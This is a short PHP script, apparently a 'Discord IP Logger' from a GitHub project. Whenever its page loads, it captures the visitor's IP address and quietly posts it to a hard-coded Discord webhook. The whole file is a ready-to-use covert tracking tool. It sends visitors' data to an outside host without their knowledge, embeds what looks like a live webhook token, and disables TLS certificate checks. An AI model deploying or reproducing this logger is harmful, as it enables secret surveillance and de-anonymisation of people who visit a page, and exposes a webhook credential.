<?php
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

$url = "https://discord.com/api/webhooks/1177535980685762563/ojftU86le1NidS58lF71s1-KQo7uNMUqc-HdFsFVmE2E2pqXN8vmd_d4r9Yb0vAoEZ0h"; // Change this to your discord webhook url
$headers = [ 'Content-Type: application/json; charset=utf-8' ];
$POST = [ 'username' => 'Discord IP Logger by https://github.com/theravenstone', 'content' => $ip ];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
echo $response   = curl_exec($ch);
?>
